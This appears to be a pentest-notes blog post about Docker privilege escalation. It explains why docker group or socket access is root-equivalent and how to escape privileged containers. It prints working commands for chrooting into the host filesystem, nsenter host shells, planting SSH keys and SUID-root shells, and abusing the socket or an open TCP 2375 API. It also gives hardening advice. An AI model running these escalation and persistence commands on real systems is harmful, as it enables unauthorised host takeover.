---
title: Docker
layout: post
date: 2026-08-08
description: "Why access to the Docker daemon is root, how to turn it into a host shell, and the container-side equivalents: an exposed socket, a privileged container, and the API on TCP."
permalink: /theory/misc/docker
---

## Overview

Almost every Docker finding reduces to the same sentence: **whoever can talk to the Docker daemon is root on the host.**

The daemon runs as `root`. It is driven through a Unix socket, and the API it exposes includes "start a container with these bind mounts, these capabilities, and these namespaces". There is no privilege separation inside that API: it has no concept of a caller who may start containers but may not mount `/`. A client that can reach the socket can ask a root process to hand it the host filesystem, and the daemon complies, because from its point of view that is a routine request from an authorised client.

That is documented behaviour rather than a vulnerability, and there is no CVE for it. Docker's own [daemon attack surface notes](https://docs.docker.com/engine/security/#docker-daemon-attack-surface) state it plainly: only trusted users should be allowed to control the daemon.

The practical consequences are worth spelling out, because they are what turn a contained foothold into a total one:

| Reachable | Equivalent to |
|---|---|
| Membership in the `docker` group | Root on the host |
| Write access to `/var/run/docker.sock` | Root on the host |
| The socket bind-mounted into a container | Root on the *host*, from inside the container |
| Daemon API on TCP 2375 with no TLS | Root on the host, from the network |

> Treat `docker` group membership in an audit exactly as you would treat a `NOPASSWD: ALL` sudo rule, because it is the same grant with a friendlier name. A service account placed in that group for deployment convenience means every RCE bug in that service is a full host compromise rather than a contained one.
{: .prompt-danger }

## Finding it

The group shows up in `id`, which is why `id` is worth running as the very first command after any foothold:

```bash
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)
```

The socket is the more general check, since a process can have write access to it without the group appearing anywhere:

```bash
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 Aug  8 08:21 /var/run/docker.sock
```

`root:docker` with mode `660` is the stock configuration. The group is the only thing standing between an unprivileged user and a root-owned API.

Also worth checking, in rough order of how often they pay off:

```bash
# other root-equivalent groups, same reasoning
id | grep -oE 'docker|lxd|disk|adm|sudo|wheel'

# is the daemon listening on TCP as well as the socket?
ss -ltnp | grep -E '2375|2376'

# can we reach the API at all, group or not?
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

A successful `/version` response is the confirmation that matters. Everything after this point assumes it works.

## Escalating with the daemon

All of these are the same primitive expressed differently: mount something from the host into a container you control, then use the container's `root` to act on it.

### Read a file

The smallest possible action, and the right first move because it changes nothing on disk:

```bash
docker run --rm -v /root:/mnt/root alpine cat /mnt/root/root.txt
```

`-v /root:/mnt/root` bind-mounts the host's `/root` into the container. The container's default user is `root`, so ownership and permissions on the host side are irrelevant.

`--privileged` is not needed for this and is worth omitting. It is habit copied from tutorials rather than a requirement, and it substantially widens what the container can do:

```bash
docker run --rm alpine grep ^CapEff /proc/self/status              # 14 capabilities
docker run --rm --privileged alpine grep ^CapEff /proc/self/status # all 41, plus device access
```

### A full host shell

Mount the whole filesystem and `chroot` into it. This is the default choice: it needs nothing from the host beyond the mount, it leaves nothing behind, and it works everywhere.

```bash
docker run -it --rm -v /:/host alpine chroot /host /bin/bash
```

An alternative that gives a shell in the host's namespaces rather than a chroot, which matters if you need the host's process table or network stack:

```bash
docker run -it --rm --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

`--pid=host` puts the container in the host PID namespace so that PID 1 is the host's init, and `nsenter -t 1` then joins that process's mount, UTS, network and IPC namespaces. The result is indistinguishable from a root shell on the host.

### Persistence

Both of these write to the host and both need cleaning up:

```bash
# root's authorized_keys
docker run --rm -v /root:/mnt/root alpine sh -c \
  'mkdir -p /mnt/root/.ssh && echo "<pubkey>" >> /mnt/root/.ssh/authorized_keys'

# a SUID-root shell, see the caveat below for the destination
docker run --rm -v /:/host alpine sh -c \
  'cp /host/bin/bash /host/var/tmp/rootbash && chmod 4755 /host/var/tmp/rootbash'
```

### The SUID caveat that wastes an hour

The SUID variant fails silently in the place most people put it, with no error to explain why. Run it correctly and the result looks like this:

```bash
/var/tmp/rootbash -p -c id
```

```
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),961(docker)
```

`euid=0(root)` is the signature of success. The real uid stays the caller's and only the *effective* uid is root, which is also why `-p` is mandatory: without it `bash` deliberately drops euid back to uid at startup.

Put the identical file in `/tmp` and it runs with `euid=1000`, despite being genuinely SUID root:

```
-rwsr-xr-x 1 root root 1.2M /tmp/rootbash
```

The cause is on the host, not in the container. When the destination filesystem is mounted **`nosuid`**, the kernel ignores the setuid bit at `execve()`. Systemd mounts every tmpfs that way by default, which rules out `/tmp`, `/dev/shm` and `/run` in one sweep:

```bash
findmnt -rno TARGET,FSTYPE,OPTIONS | grep nosuid
```

```
/tmp      tmpfs  rw,nosuid,nodev,nr_inodes=1048576,inode64,huge=advise,usrquota
/dev/shm  tmpfs  rw,nosuid,nodev,inode64,huge=advise,usrquota
/run      tmpfs  rw,nosuid,nodev,mode=755,inode64
```

Adding `--privileged` does not help, and the reason is worth understanding: the restriction is a property of the host's mount table, which the container never touches. Pick a directory on a filesystem that is not `nosuid`, which in practice means the root filesystem. `/var/tmp` and `/opt` are the usual choices.

> The same `nosuid` rule kills every SUID-drop technique, not just this one. If a SUID binary you planted runs as the calling user with no error, check the mount options before assuming the technique is wrong.
{: .prompt-tip }

## From inside a container

The situation reverses when the foothold is *in* a container rather than on the host. First establish that you are in one:

```bash
ls -la /.dockerenv                    # present in most Docker containers
cat /proc/1/cgroup                    # docker/ or containerd paths on cgroup v1
cat /proc/self/mountinfo | head       # overlayfs root is a strong signal
hostname                              # often the short container ID
```

None of these are guaranteed. `/.dockerenv` is absent under some runtimes and configurations, and cgroup v2 hosts show a flat path, so treat a negative as inconclusive rather than as proof you are on metal.

Then look for the three ways out.

**The socket was mounted in.** This is the most common real-world misconfiguration, usually added so a CI runner or a management container can drive Docker. It collapses straight back to the previous section:

```bash
ls -la /var/run/docker.sock
```

With no `docker` client installed, the API is plain HTTP over the socket:

```bash
# list images available to the daemon
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq -r '.[].RepoTags[]?'

# create a container with the host root mounted, then start it
curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

**The container is privileged.** `--privileged` grants all 41 capabilities, drops the seccomp and AppArmor confinement, and exposes host devices under `/dev`. Host disks appear there, and can simply be mounted:

```bash
capsh --print | grep -c cap_          # ~41 in a privileged container
fdisk -l                              # host block devices visible
mkdir /mnt/host && mount /dev/sda1 /mnt/host
```

**The daemon is on TCP.** Port 2375 is the plaintext API and 2376 is the TLS one. An exposed 2375 with no TLS is unauthenticated root on that host, from anywhere that can route to it:

```bash
curl -s http://<target>:2375/version
docker -H tcp://<target>:2375 run -it --rm -v /:/host alpine chroot /host sh
```

## Hardening notes

- Do not put service accounts in the `docker` group. If a process must manage containers, front the daemon with something that can express a policy, or use a rootless runtime.
- Rootless Docker and Podman remove the root daemon entirely, which removes this whole class rather than mitigating it.
- Never bind-mount `/var/run/docker.sock` into a container. If a container genuinely needs to orchestrate others, that container is part of the host's trust boundary and should be treated as such.
- Never expose the daemon on TCP without mutual TLS, and prefer not exposing it at all.
- `--privileged` should be justified per container, not applied by default. Most workloads that "need" it need one or two specific capabilities via `--cap-add`.
- Deny PHP or CGI execution in writable web directories, and keep the web server user's group memberships to the minimum. The combination of a web RCE and a root-equivalent group is what turns a foothold into a compromise.

## Examples on this site

Boxes on this site whose path goes through Docker, listed automatically from their tags:

{% assign docker_tags = "docker" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if docker_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [Docker - Docker daemon attack surface](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
- [Docker - Run the Docker daemon as a non-root user (rootless mode)](https://docs.docker.com/engine/security/rootless/)
- [Docker Engine API reference](https://docs.docker.com/reference/api/engine/)
- [Linux manual - capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Linux manual - mount(8), the `nosuid` option](https://man7.org/linux/man-pages/man8/mount.8.html)
